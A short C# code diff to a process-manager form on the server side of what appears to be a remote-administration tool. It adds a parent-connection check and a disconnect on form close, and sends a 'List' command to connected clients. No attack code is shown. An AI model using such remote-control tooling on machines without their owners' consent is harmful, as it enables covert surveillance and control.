@@ -17,6 +17,7 @@ namespace Server.Forms
     {
         public Form1 F { get; set; }
         internal Clients Client { get; set; }
+        internal Clients ParentClient { get; set; }
 
         public FormProcessManager()
         {
@@ -28,7 +29,7 @@ namespace Server.Forms
         {
             try
             {
-                if (!Client.TcpClient.Connected) this.Close();
+                if (!Client.TcpClient.Connected || !ParentClient.TcpClient.Connected) this.Close();
             }
             catch { this.Close(); }
         }
@@ -60,6 +61,15 @@ namespace Server.Forms
                 msgpack.ForcePathObject("Option").AsString = "List";
                 ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
             });
+        }
+
+        private void FormProcessManager_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            try
+            {
+                Client?.Disconnected();         
+            }
+            catch { }
         }
     }
 }
